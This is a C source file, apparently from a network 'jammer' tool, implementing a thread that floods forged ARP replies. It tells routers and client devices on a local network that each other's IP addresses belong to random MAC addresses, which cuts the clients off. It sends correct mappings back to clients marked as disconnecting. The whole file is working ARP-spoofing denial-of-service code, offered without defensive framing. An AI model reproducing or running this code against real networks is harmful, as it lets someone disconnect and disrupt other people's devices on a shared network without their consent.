#include "./process/jammer.h"

#include <stdbool.h>
#include <stdint.h>

#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>

#include "./network/arp.h"
#include "./network/network.h"
#include "network/device.h"
#include "network/forgery.h"

void *jam_jammed_devices(void *arg) {
    jammer_args_t *args = (jammer_args_t *)arg;
    network_t *network = args->network;
    volatile bool *stop_flag = args->stop_flag;

    network_socket_t network_socket = args->network_socket;
    uint8_t random_mac[6];

    int cleanup = 3;
    while (cleanup) {
        pthread_mutex_lock(&network->lock);
        for (size_t i = 0; i < network->length; i++) {
            device_t *device_router = &network->devices[i];
            if (device_router->role != DEVICE_ROLE_ROUTER) {
                continue;
            }
            uint32_t router_ip = htonl(device_router->ip);

            for (size_t y = 0; y < network->length; y++) {
                device_t *device_client = &network->devices[y];
                if (device_client->role != DEVICE_ROLE_CLIENT) {
                    continue;
                }

                uint32_t device_ip = htonl(device_client->ip);
                device_state_t state = device_client->state;
                if (state == DEVICE_STATE_ALIVE || state == DEVICE_STATE_ADDED) {
                    network_forgery_mac(random_mac);

                    arp_send_reply(&network_socket, device_router->mac, random_mac, device_ip,
                                   device_router->mac, router_ip);
                    arp_send_reply(&network_socket, device_client->mac, random_mac, router_ip,
                                   device_client->mac, device_ip);
                } else if (state == DEVICE_STATE_DISCONNECTING) {
                    arp_send_reply(&network_socket, device_router->mac, device_client->mac,
                                   device_ip, device_router->mac, router_ip);
                    arp_send_reply(&network_socket, device_client->mac, device_router->mac,
                                   router_ip, device_client->mac, device_ip);
                }
            }
        }
        if (*stop_flag) {
            cleanup--;
        }
        pthread_mutex_unlock(&network->lock);

        sleep(2);
    }
    return NULL;
}
